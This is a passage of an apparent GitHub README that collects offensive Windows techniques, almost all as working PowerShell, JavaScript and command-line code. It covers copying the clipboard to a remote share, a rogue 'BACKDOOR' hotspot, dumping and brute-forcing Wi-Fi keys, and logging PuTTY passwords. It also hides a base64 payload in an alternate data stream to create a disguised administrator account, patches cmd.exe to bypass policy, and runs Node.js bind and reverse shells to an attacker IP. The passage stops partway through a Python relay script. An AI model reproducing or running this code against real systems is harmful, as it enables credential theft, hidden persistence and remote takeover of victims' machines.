# Windows-Trix
An assortment of techniques that can be used to exploit Windows.  These are uncommon exploits that are not often used.  Most of these assume that you have or can attain administrator or system privileges on the endpoint.  You will need to change IP addresses and other references in the examples to fit your environment.

## >> Copying data from the clipboard using powershell

```powershell
Add-Type -AssemblyName System.Windows.Forms

if($([System.Windows.Forms.Clipboard]::ContainsImage()))
{
   $cb = [System.Windows.Forms.Clipboard]::GetImage()
   $file = '\\10.192.103.49\smbdata\clipboard.png'
   $cb.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
}
else
{
   if($([System.Windows.Forms.Clipboard]::ContainsText()))
   {
      $cb = [System.Windows.Forms.Clipboard]::GetText()
      $file = '\\10.192.103.49\smbdata\clipboard.txt'
      $cb > $file
   }
   else
   {
      Write-Output "Nothing in clipboard to save."
   }
}
```

## >> Configuring a backdoor hotspot using powershell

**Activation script** `wifi-start.ps1`<br />
```powershell
regsvr32 /s hnetcfg.dll
sc start SharedAccess | Out-Null

$ssid = "BACKDOOR"
$wpsk = "1234567890"

$hsup = netsh wlan show drivers | Select-String "Hosted network supported" | Select-String "Yes"
if(!$hsup)
{
   Write-Host "Wireless host mode not supported."
   Exit
}
$huse = netsh wlan show interfaces | Select-String "Hosted network status" | Select-String ": Started"
if($huse)
{
   Write-Host "Wireless host mode already in use."
   Exit
}
$wuse = netsh wlan show interfaces | Select-String "State" | Select-String "disconnected"
if(!$wuse)
{
   Write-Host "Wireless interface already in use."
   Exit
}
$ename = Get-NetAdapter | Where-Object {$_.PhysicalMediaType -eq '802.3' -and $_.MediaConnectionState -eq 'Connected'} | Select-Object -Property Name
if($ename.Name -eq $null)
{
   Write-Host "Connected ethernet interface name not identified."
   Exit
}
$enet_name = $ename.Name
$eipa = Get-NetIPAddress -InterfaceAlias $enet_name | Select-Object -Property IPAddress
if($eipa.IPAddress -eq $null)
{
   Write-Host "Ethernet interface IP Address not identified."
   Exit
}
$hcfg = netsh wlan set hostednetwork mode=allow ssid="$ssid" key="$wpsk" | Select-String "successfully changed"
if(!$hcfg)
{
   Write-Host "Wireless host mode could not be configured."
   Exit
}
$hact = netsh wlan start hostednetwork | Select-String "hosted network started"
if(!$hact)
{
   Write-Host "Wireless host mode could not be activated."
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$wname = Get-NetAdapter | Where-Object {($_.PhysicalMediaType -eq 'Native 802.11' -or $_.PhysicalMediaType -eq 'Wireless LAN') -and $_.Status -eq 'Up' -and $_.AdminStatus -eq 'Up' -and $_.ifDesc -like 'Microsoft Hosted Network Virtual Adapter*'} | Select-Object -Property Name
if($wname.Name -eq $null)
{
   Write-Host "Wireless host mode interface name could not be identified."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$wlan_name = $wname.Name
$nso = New-Object -ComObject HNetCfg.HNetShare
if($nso -eq $null)
{
   Write-Host "Failed to create NetShare object."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$netpub = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$enet_name" }
$cfgpub = $nso.INetSharingConfigurationForINetConnection.Invoke($netpub)
if($cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS ethernet interface already in use."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$netpri = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$wlan_name" }
$cfgpri = $nso.INetSharingConfigurationForINetConnection.Invoke($netpri)
if($cfgpri.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless interface already in use."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$cfgpri.EnableSharing(1)
$cfgpub.EnableSharing(0)
if($cfgpri.SharingEnabled -eq $true -and $cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless hotspot configured successfully."
   Exit
}
else
{
   Write-Host "ICS wireless hotspot setup failed."
   $cfgpri.DisableSharing()
   $cfgpub.DisableSharing()
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
```

If you get error `Exception from HRESULT: 0x80040201` from the `EnableSharing` method then run the following VB script to delete all interface ICS configurations and try the `wifi-start.ps1` script again.<br />
```
set WMI = GetObject("WinMgmts:\root\Microsoft\HomeNet")
set objs1 = WMI.ExecQuery("SELECT * FROM HNet_ConnectionProperties WHERE IsIcsPrivate = TRUE")
for each obj in objs1
   obj.IsIcsPrivate = FALSE
   obj.Put_
next
set objs2 = WMI.ExecQuery("SELECT * FROM HNet_ConnectionProperties WHERE IsIcsPublic = TRUE")
for each obj in objs2
   obj.IsIcsPublic = FALSE
   obj.Put_
next
```

**Deactivation script** `wifi-stop.ps1`<br />
```powershell
regsvr32 /s hnetcfg.dll

$ssid = "BACKDOOR"

$huse = netsh wlan show interfaces | Select-String "Hosted network status" | Select-String "Started"
if(!$huse)
{
   Write-Host "Wireless host mode not in use."
   Exit
}
$ename = Get-NetAdapter | Where-Object {$_.PhysicalMediaType -eq '802.3' -and $_.MediaConnectionState -eq  'Connected'} | Select-Object -Property Name
if($ename.Name -eq $null)
{
   Write-Host "Connected ethernet interface name not identified."
   Exit
}
$enet_name = $ename.Name
$eipa = Get-NetIPAddress -InterfaceAlias $enet_name | Select-Object -Property IPAddress
if($eipa.IPAddress -eq $null)
{
   Write-Host "Ethernet interface IP Address not identified."
   Exit
}
$wname = Get-NetAdapter | Where-Object {($_.PhysicalMediaType -eq 'Native 802.11' -or $_.PhysicalMediaType -eq 'Wireless LAN') -and $_.Status -eq 'Up' -and $_.AdminStatus -eq 'Up' -and $_.ifDesc -like 'Microsoft Hosted Network Virtual Adapter*'} | Select-Object -Property Name
if($wname.Name -eq $null)
{
   Write-Host "Wireless host mode interface name could not be identified."
   Exit
}
$wlan_name = $wname.Name
$nso = New-Object -ComObject HNetCfg.HNetShare
if($nso -eq $null)
{
   Write-Host "Failed to create NetShare object."
   Exit
}
$netpub = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$enet_name" }
$cfgpub = $nso.INetSharingConfigurationForINetConnection.Invoke($netpub)
$netpri = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$wlan_name" }
$cfgpri = $nso.INetSharingConfigurationForINetConnection.Invoke($netpri)
if($cfgpri.SharingEnabled -eq $true -and $cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless hotspot deactivated."
   $cfgpri.DisableSharing()
   $cfgpub.DisableSharing()
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
else
{
   Write-Host "Active ICS hotspot not detected."
   Exit
}
```

## >> Retrieving wireless profile passwords using powershell

```powershell
$wp = @()
(((netsh wlan show profiles) | out-string ).split("`r`n")).ForEach({
   if($_ -Like '*All user profile*')
   {
      $t = $_.Split(":")
      $wp += $t[1].trim()
   }
})
Write-Host "SSID -> PSK"
Write-Host "-----------------------------------------"
$wp.foreach({
   $id = $_
   (((netsh wlan show profile "$id" key=clear) | Out-String).Split("`r`n")).ForEach({
   if($_ -Like '*Key content*')
   {
      $pw = ($_.Split(":"))[1].trim()
      Write-Host "$id -> $pw"
   }
})})
```

## >> View wireless networks and signal strength using netsh

```netsh wlan show networks mode=bssid```

## >> Slow on-line brute-force wireless password using powershell

```powershell
$ssid = "iPhone"
$wordlist = @("password",
              "secretkey!",
              "wifiaccess",
              "wifipassword",
              "1234567890",
              "Pa55w0rd")
$xmlfile = "C:\windows\temp\BruteForce.xml"
$pxml = @'
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
   <name>BruteForce</name>
   <SSIDConfig>
      <SSID>
         <hex>------</hex>
         <name>------</name>
      </SSID>
   </SSIDConfig>
   <connectionType>ESS</connectionType>
   <connectionMode>auto</connectionMode>
   <MSM>
      <security>
         <authEncryption>
            <authentication>WPA2PSK</authentication>
            <encryption>AES</encryption>
            <useOneX>false</useOneX>
         </authEncryption>
         <sharedKey>
            <keyType>passPhrase</keyType>
            <protected>false</protected>
            <keyMaterial>------</keyMaterial>
         </sharedKey>
      </security>
   </MSM>
</WLANProfile>
'@
$ssidhex = ""
$ssid.ToCharArray() | foreach-object -process {$ssidhex += '{0:X}' -f [int][char]$_}
(((netsh wlan show interfaces) | out-string ).split("`r`n")).ForEach({
   if($_ -Like '*Name*')
   {
      $t = $_.Split(":")
      $wlan = $t[1].trim()
   }
})
if($wlan -eq $null)
{
   Write-Host "Could not identify the wireless adapter."
   Exit
}
foreach($key in $wordlist)
{
   if(Test-Path $xmlfile) {Remove-Item -Path "$xmlfile" -Force}
   ForEach($line in $($pxml -split "`r`n"))
   {
      $line = $line -Replace [regex]::Escape("<hex>------</hex>"),"<hex>$ssidhex</hex>"
      $line = $line -Replace [regex]::Escape("<name>------</name>"),"<name>$ssid</name>"
      $line = $line -Replace [regex]::Escape("<keyMaterial>------</keyMaterial>"),"<keyMaterial>$key</keyMaterial>"
      $line | Out-File "$xmlfile"
   }
   netsh wlan add profile filename="$xmlfile" | Out-Null
   netsh wlan connect name="BruteForce" interface="$wlan" | Out-Null
   Start-Sleep -s 4
   $state = ""
   (((netsh wlan show interfaces interface="$wlan") | out-string ).split("`r`n")).ForEach({
      if($_ -Like '*State*')
      {
         $t = $_.Split(":")
         $state = $t[1].trim()
      }
   })
   if($state -eq "connected")
   {
      Write-Host "Wireless PSK -> $key"
      netsh wlan delete profile name="BruteForce" | Out-Null
      Exit
   }
   netsh wlan delete profile name="BruteForce" | Out-Null
}
```

## >> Logging PuTTY credentials using powershell

```powershell
$user = Get-WMIObject -class Win32_ComputerSystem | select -ExpandProperty username
if(!$user)
{
   Write-Host "Currently logged on user not identified."
   Exit
}
Write-Host "Currently logged on user = $user"
$sidu = (New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).value
if(!$sidu)
{
   Write-Host "User SID not identified."
   Exit
}
$putty = Test-Path -Path "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if($putty -eq $False)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$sess = Get-ChildItem "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if(!$sess)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$skey = $sess | Foreach-Object {Get-ItemProperty $_.PsPath}
$snum = 0
Foreach($item in $skey)
{
   $rkey = Convert-Path $item.PsPath
   $rkey = "REGISTRY::$rkey"
   New-ItemProperty -Path "$rkey" -Name "LogFileName" -Value "C:\Windows\Temp\puttylog$snum.log" -Type String -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFlush" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogType" -Value 3 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFileClash" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitData" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitPasswords" -Value 0 -Type DWord -Force | Out-Null
   <# to remove logging
   New-ItemProperty -Path "$rkey" -Name "LogFileName" -Value "" -Type String -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFlush" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogType" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFileClash" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitData" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitPasswords" -Value 1 -Type DWord -Force | Out-Null
   #>
   $snum++
}
if($snum -gt 0)
{
   Write-Host "$snum PuTTY session(s) were configured to log credentials."
}
else
{
   Write-Host "There were no PuTTY sessions to configure."
}
```

**Listing PuTTY log paths**<br />
```powershell
$user = Get-WMIObject -class Win32_ComputerSystem | select -ExpandProperty username
if(!$user)
{
   Write-Host "Currently logged on user not identified."
   Exit
}
Write-Host "Currently logged on user = $user"
$sidu = (New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).value
if(!$sidu)
{
   Write-Host "User SID not identified."
   Exit
}
$putty = Test-Path -Path "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if($putty -eq $False)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$sess = Get-ChildItem "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if(!$sess)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$skey = $sess | Foreach-Object {Get-ItemProperty $_.PsPath}
$snum = 0
Foreach($item in $skey)
{
   $rkey = Convert-Path $item.PsPath
   $rkey = "REGISTRY::$rkey"
   $ppath = Get-ItemProperty -Path "$rkey" -Name "LogFileName"
   if($ppath)
   {
      $ppath.LogFileName
   }
   $snum++
}
if($snum -gt 0)
{
   Write-Host "$snum PuTTY session(s) have a log path."
}
else
{
   Write-Host "No PuTTY logging identified."
}
```

## >> Hiding payloads in Alternate Data Streams (ADS)

**Create a container file on an NTFS file system**<br />
`echo This is a harmless text file :) > c:\windows\temp\harmless.txt`

**Verify the contents of the container file**<br />
`type c:\windows\temp\harmless.txt`<br />
(output) `This is a harmless text file :)`

**Check the file size of the container file**<br />
`dir c:\windows\temp\harmless.txt`<br />
(output) `1 File(s) 34 bytes`

**Create powershell payload as base64 to add a backdoor account**<br />
Run `cat | base64 -w 0; echo` then paste the following code, press ctrl-d (EOF) when finished.<br />
```powershell
$Password = ConvertTo-SecureString "+BackD00rAdmin+" -AsPlainText -Force
New-LocalUser -Name "BDAdmin" -Password $Password -AccountNeverExpires -FullName "BD Admin" -Description "Helpdesk account, do not delete" -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member "BDAdmin"
```

**Create the hidden payload data stream using the base64 output above**<br />
`echo JFBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAiK0JhY2tEMDByQWRtaW4rIiAtQXNQbGFpblRleHQgLUZvcmNlCk5ldy1Mb2NhbFVzZXIgLU5hbWUgIkJEQWRtaW4iIC1QYXNzd29yZCAkUGFzc3dvcmQgLUFjY291bnROZXZlckV4cGlyZXMgLUZ1bGxOYW1lICJCRCBBZG1pbiIgLURlc2NyaXB0aW9uICJIZWxwZGVzayBhY2NvdW50LCBkbyBub3QgZGVsZXRlIiAtUGFzc3dvcmROZXZlckV4cGlyZXMKQWRkLUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwICJBZG1pbmlzdHJhdG9ycyIgLU1lbWJlciAiQkRBZG1pbiIK > c:\windows\temp\harmless.txt:payload.ps1`

**Verify the size and contents of** `harmless.txt` **have not changed**<br />
`dir c:\windows\temp\harmless.txt`<br />
(output) `1 File(s) 34 bytes`<br />
`type c:\windows\temp\harmless.txt`<br />
(output) `This is a harmless text file :)`

**Detonate the hidden payload to create the backdoor account**<br />
```powershell
powershell -command " &{[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-Content c:\windows\temp\harmless.txt -Stream payload.ps1 -Raw))) | Invoke-Expression}"
```

## >> TCP port scanning using certutil

This technique can be used when pivoting.  The error code indicates the status of the remote service.<br />
The target being scanned in this example is 10.1.2.3 port 8080.

`certutil -urlcache -split -f http://10.1.2.3:8080/doesnotexist.file doesnotexist.file | findstr FAILED`<br />
Response `0x80072f78` the port responded but is not HTTP protocol.<br />
Response `0x80190194` the port responded to HTTP but `doesnotexist.file` is not present (404 error).<br />
Response `0x80072efd` the port did not respond.<br />
Response does not contain an error code, then the file was retrieved successfully.

## >> TCP port scanning using powershell

**Port sweep single host**<br />
```powershell
$TcpPorts = 21,22,23,25,80,81,110,111,135,139,143,389,443,445,465,513,514,515,587,636,993,995,1080,1433,3128,3306,3389,4786,5800,5900,8080,8081,8088,8443,8888,10000
$IpAddress = "192.168.1.19"
$MsTimeout = 100

foreach($Port in $TcpPorts)
{
   $Socket = New-Object Net.Sockets.TcpClient
   $Socket.SendTimeout = 100
   $ErrorActionPreference = 'SilentlyContinue'
   $AsyncResult = $Socket.BeginConnect($IpAddress, $Port, $null, $null)
   Start-Sleep -milli $MsTimeout
   if($Socket.Connected)
   {
      Write-Output "$IpAddress port $Port is open"
   }
   else
   {
       # handle closed status here
   }
   $Socket.Close()
   $Socket = $null
}
```

**Host sweep single port**<br />
```powershell
$TcpPort = 445
$IpNet = "10.100.120"
$MsTimeout = 100

for($IpHost = 1; $IpHost -lt 256; $IpHost++)
{
   $IpAddress = "$IpNet.$IpHost"
   $Socket = New-Object Net.Sockets.TcpClient
   $Socket.SendTimeout = 100
   $ErrorActionPreference = 'SilentlyContinue'
   $AsyncResult = $Socket.BeginConnect($IpAddress, $TcpPort, $null, $null)
   Start-Sleep -milli $MsTimeout
   if($Socket.Connected)
   {
      Write-Output "$IpAddress port $TcpPort is open"
   }
   else
   {
       # handle closed status here
   }
   $Socket.Close()
   $Socket = $null
}
```

## >> Using netsh to capture network packets

This technique is useful for capturing insecure protocol traffic on a host (e.g. telnet, FTP, HTTP, SNMP).<br />
This example will filter the trace on IP address 10.2.5.92 and halt after 10MB is captured.

**Stop any currently running captures**<br />
`netsh trace stop`

**Start the packet capture**<br />
`netsh trace start capture=yes ipv4.address=10.2.5.92 filemode=single maxsize=10 overwrite=yes tracefile=c:\Windows\temp\tracefile.etl`

**Convert the etl file to cap format for wireshark**<br />
Download Microsoft Network Monitor 3.4 from [HERE](https://www.microsoft.com/en-us/download/details.aspx?id=4865).<br />
Open `tracefile.etl` with Network Monitor 3.4 and save as `tracefile.cap`.<br />
Open `tracefile.cap` using wireshark.

## >> Performing SNMP from powershell

The Windows ISNMP Automation Interface can be used to perform GET and SET operations.  Cisco 3750 OID used in this example.

```powershell
# Get the system description
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.1.1.0')
$objSNMP.Close()
```

```powershell
# Get an interface description (Ge2/0/24)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.2.2.1.2.10624')
$objSNMP.Close()
```

```powershell
# Get an interface VLAN assignment (Ge2/0/24)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.4.1.9.9.68.1.2.2.1.2.10624')
$objSNMP.Close()
```

```powershell
# Get an interface link status (Ge2/0/24, 1 = up, 2 = down)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.2.2.1.8.10624')
$objSNMP.Close()
```

```powershell
# Change an interface VLAN assignment (Ge2/0/24, to VLAN 315)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Set('.1.3.6.1.4.1.9.9.68.1.2.2.1.2.10624', 315)
$objSNMP.Close()
```

## >> Circumventing cmd.exe policy restrictions

Windows group policy can be configured to disable execution of the command prompt by setting an option under Computer Policy >> User Configuration >> Administrative Templates >> System.  This results in the following message being displayed when attempting to launch the command prompt.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd02.png)

The cmd.exe program tests for the following registry value to determine if this policy is set:<br />
`HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD`

The unicode string for the registry value exists in the cmd.exe binary.  You can make a copy of cmd.exe and edit this string to defeat policy checking.  Here is an example of generating the hex characters to search for.

`echo DisableCMD | iconv -t utf-16le | hexdump -Cv`<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd00.png)

Using certutil.exe you can make a copy of cmd.exe represented as a text file containing hex characters.<br />
`c:\windows\system32\certutil.exe -encodehex c:\windows\system32\cmd.exe c:\users\xxxxxxxx\appdata\local\temp\cmd.txt`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd03.png)

Now edit the text file using notepad.<br />
`c:\windows\system32\notepad.exe c:\users\xxxxxxxx\appdata\local\temp\cmd.txt`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd04.png)

Find the hex characters that make up the unicode string generated earlier.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd05.png)<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd06.png)

Edit the hex values from `44 00 69 00` to `44 00 00 00` and save the text file.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd07.png)

Convert the text file back into an exe.<br />
`c:\windows\system32\certutil.exe -decodehex c:\windows\xxxxxxxx\appdata\local\temp\cmd.txt c:\windows\xxxxxxxx\appdata\local\temp\cmd.exe`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd08.png)

Double-click on the modified copy of cmd.exe.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd09.png)

You now have a command shell.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd10.png)

## >> Node.js bind and reverse shell using node.exe

The Node.js JavaScript runtime is occasionally found on a Windows system either as a standalone installation or bundled in with some other application (e.g. Adobe Creative Cloud).  You can also extract the node.exe binary from the [ZIP package](https://nodejs.org/en/download/ "Node.js Download") and copy it to a victim computer.

Example of a bind shell (socket server)<br />
```javascript
// Example command execution with authentication.
// (1) Save this script as "server.js"
// (2) Launch the bind shell on the victim "node.exe server.js"
// (3) Connect from the attacking computer "nc <victim IP> 4444"
// command: ug0tpwn3d, allows the server to start processing commands.
// command: DISCONNECT, drops current connection, must reauth with key on new client connect.
// command: ABORT, terminates the script.

var net = require('net');
var spawn = require('child_process').spawn;
var c2host = '0.0.0.0';
var c2port = 4444;
var state = 'DISABLED';
var authkey = 'ug0tpwn3d';

var server = net.createServer(function(socket)
{
   socket.write('Ready...\r\n');
   socket.on('data', function(directive)
   {
      if(directive.toString().trim() === authkey && state === 'DISABLED')
      {
         // authn success, start processing commands
         state = 'ENABLED';
         socket.write('Authentication successful.  Accepting commands...\r\n');
      }
      else if(directive.toString().trim() === 'DISCONNECT' && state === 'ENABLED')
      {
         // drop current connection and disable command processor
         socket.destroy();
         state = 'DISABLED';
      }
      else if(directive.toString().trim() === 'ABORT' && state === 'ENABLED')
      {
         // terminate the script
         socket.destroy();
         process.exit(1);
      }
      else if(state === 'ENABLED')
      {
         // execute a command
         cmd = spawn(process.env.comspec, ['/c', directive.toString().trim()], {windowsVerbatimArguments: true});
         cmd.stdout.on('data', function(output)
         {
            socket.write(output.toString());
         });
         cmd.stderr.on('data', function(output)
         {
            socket.write(output.toString());
         });
      }
   });
}).listen(c2port, c2host);
```

Example of a reverse shell (socket client)<br />
```javascript
// Example command execution.
// (1) Save this script as "client.js"
// (2) Start a netcat listener on the attacking computer "nc -nlvp 4444"
// (3) Launch the reverse shell on the victim "node.exe client.js"
// command: ABORT, terminates the script.

var net = require('net');
var spawn = require('child_process').spawn;
var c2host = '192.168.1.119';
var c2port = 4444;

var client = new net.Socket();
client.connect(c2port, c2host, function()
{
   client.write('Ready...\r\n');
});
client.on('data', function(directive)
{
   if(directive.toString().trim() === 'ABORT')
   {
      // terminate the script
      client.destroy();
      process.exit(1);
   }
   else
   {
      // execute a command
      cmd = spawn(process.env.comspec, ['/c', directive.toString().trim()], {windowsVerbatimArguments: true});
      cmd.stdout.on('data', function(output)
      {
         client.write(output.toString());
      });
      cmd.stderr.on('data', function(output)
      {
         client.write(output.toString());
      });
   }
});
```

## >> TCP port forwarding with netsh

Forward TCP port 2222 to port 22 on remote host.

`netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=10.192.103.49`

Remove port forwarding rule.

`netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=0.0.0.0`

## >> TCP local port forwarding with powershell

Local port forwarder using a bind socket.  Example listens on port 2222 and forwards to remote host 192.168.1.19 port 22.

```powershell
# Target parameters
$tcpRHost = "192.168.1.19"
$tcpRPort = "22"

# Bind parameters
$tcpLAddr = "0.0.0.0"
$tcpLPort = "2222"

try {
   $TcpServer = New-Object System.Net.Sockets.TcpListener([system.net.IPAddress]::Parse($tcpLAddr), $tcpLPort)
}
catch {
   Write-Output "Failed to listen on $tcpLAddr port $tcpLPort"
   exit
}

try {
   $TcpServer.Start()
}
catch {
   Write-Output "Failed to start server on $tcpLAddr port $tcpLPort"
   $tcpServer.Stop()
   exit
}

$tcpConnection = $tcpServer.AcceptTcpClient()
$RemoteIP = $tcpConnection.Client.RemoteEndPoint.Address.IPAddressToString
Write-Output "Received connection from $RemoteIP"
if($tcpConnection -ne $null)
{
   $tcpServer.Stop()
   try {
      $tcpClient = New-Object System.Net.Sockets.TcpClient($tcpRHost, $tcpRPort)
   }
   catch {
      Write-Output "Failed to connect to $tcpRHost port $tcpRPort"
      exit
   }
}
else
{
   Write-Output "Accept error"
   $tcpServer.Stop()
   exit
}

$LStream = $tcpConnection.GetStream()
$RStream = $tcpClient.GetStream()

$LBuffer = New-Object Byte[] $tcpConnection.ReceiveBufferSize
$RBuffer = New-Object Byte[] $tcpClient.ReceiveBufferSize

$idle = 0

while($true) {
   if($tcpConnection.Connected -and $tcpClient.Connected)
   {
      if(($tcpConnection.Client.Available -gt 0) -or ($tcpClient.Client.Available -gt 0))
      {
         if($tcpConnection.Client.Available -gt 0)
         {
            $LRead = $LStream.Read($LBuffer, 0, $LBuffer.Length)
            $RStream.Write($LBuffer, 0, $LRead)
            $idle = 0
         }
         if($tcpClient.Client.Available -gt 0)
         {
            $RRead = $RStream.Read($RBuffer, 0, $RBuffer.Length)
            $LStream.Write($RBuffer, 0, $RRead)
            $idle = 0
         }
      }
      else
      {
         Start-Sleep -Milliseconds 10
         $idle++
         if($idle -gt 3000)
         {
            # approx 30 sec idle close
            $tcpConnection.Close()
            $tcpClient.Close()
         }
      }
   }
   else
   {
      Write-Output "Connection closed"
      exit
   }
}
```

## >> TCP remote port forwarding with powershell

Remote port forwarder on attacking host relays through Windows host running a powershell port forwarder.  Example attacking Linux host runs a python script that proxies a local application through a connection received from the Windows host.  The Windows host then forwards the traffic to another remote host.  This example shows how to run a python script on attacking host 192.168.1.19 that forwards SSH to port 2222 through a connection initiated from a Windows host to the attacking machine on tunnel port 4444.  The Windows host then forwards the SSH traffic to remote host 192.168.100.109 port 22.

Python script `apprelay.py`<br />
```python
#!/usr/bin/python

import socket
import sys
import struct
from time import sleep
import select as socksel

t_port = 4444
a_port = 2222
t_host = '0.0.0.0'
a_host = 'localhost'

t_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

t_addr = (t_host, t_port)
a_addr = (a_host, a_port)

t_socket.bind(t_addr)
a_socket.bind(a_addr)

t_socket.listen(1)
t_conn, t_caddr = t_socket.accept()
